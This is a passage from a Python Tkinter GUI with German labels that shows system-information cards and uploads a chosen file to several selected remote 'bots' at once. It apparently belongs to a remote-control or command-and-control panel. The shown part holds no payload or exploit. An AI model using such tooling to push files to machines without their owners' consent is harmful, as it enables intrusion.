        ts_lbl = tk.Label(hdr, text=f"  abgerufen {ts()}", font=MONO_XS,
                          fg=TEXT3, bg=BG)
        ts_lbl.pack(side=tk.LEFT, pady=(3, 0))

        # cards grid
        cards = tk.Frame(self.sys_inner, bg=BG)
        cards.pack(fill=tk.X, padx=20, pady=(0, 20))

        for i, (k, v) in enumerate(info.items()):
            col = i % 2
            row = i // 2
            card = tk.Frame(cards, bg=BG3,
                            highlightthickness=1, highlightbackground=BORDER)
            card.grid(row=row, column=col, padx=(0, 8) if col == 0 else 0,
                      pady=(0, 8), sticky="ew")
            cards.columnconfigure(0, weight=1)
            cards.columnconfigure(1, weight=1)

            tk.Label(card, text=k, font=SANS_SM, fg=TEXT3,
                     bg=BG3, anchor="w", padx=14, pady=6
                     ).pack(fill=tk.X)
            tk.Label(card, text=str(v), font=MONO_SM, fg=TEXT,
                     bg=BG3, anchor="w", padx=14, pady=(0, 10)
                     ).pack(fill=tk.X)

    # ─── Upload ───────────────────────────────────────────────────────────────

    def _pick_file(self):
        path = filedialog.askopenfilename(title="Datei wählen")
        if path:
            self._up_filepath = path
            self._up_file.set(os.path.basename(path))

    def _upload_file(self):
        if not self._up_filepath or not os.path.exists(self._up_filepath):
            messagebox.showwarning("Keine Datei", "Bitte eine Datei wählen.")
            return
        if not self.ctrl.connected:
            messagebox.showwarning("Getrennt", "Nicht verbunden.")
            return

        targets = [bot for bot, var in self._up_bot_vars.items() if var.get()]
        if not targets:
            messagebox.showwarning("Kein Ziel", "Mindestens einen Bot auswählen.")
            return

        self.up_status.configure(text=f"⏳  Sende an {len(targets)} Bot(s)…", fg=YELLOW)

        def do():
            ok, fail = [], []
            for bot in targets:
                try:
                    resp = self._run(
                        self.ctrl.cmd_upload(bot, self._up_filepath)
                    ).result(timeout=30)
                    if resp and resp.get("status") == "ok":
                        ok.append(bot)
                        self.after(0, lambda b=bot: self._log_write(f"upload → {b} ✓", "ok"))
                    else:
                        fail.append(bot)
                        self.after(0, lambda b=bot: self._log_write(f"upload → {b} fehlgeschlagen", "err"))
                except Exception as e:
                    fail.append(bot)
                    self.after(0, lambda b=bot, ex=e: self._log_write(f"upload → {b} Fehler: {ex}", "err"))

            def update():
                if not fail:
                    self.up_status.configure(
                        text=f"✓  {len(ok)} Bot(s) erfolgreich", fg=ACCENT)
                elif not ok:
                    self.up_status.configure(
                        text=f"✗  Alle {len(fail)} fehlgeschlagen", fg=RED)
                else:
                    self.up_status.configure(
                        text=f"✓ {len(ok)} OK  ✗ {len(fail)} fehlgeschlagen", fg=YELLOW)
            self.after(0, update)

        threading.Thread(target=do, daemon=True).start()

    # ─── Cleanup ─────────────────────────────────────────────────────────────

    def _on_close(self):
        if self.ctrl.connected:
            self._run(self.ctrl.disconnect())
        self.loop.call_soon_threadsafe(self.loop.stop)
        self.destroy()


if __name__ == "__main__":
    app = App()
    app.mainloop()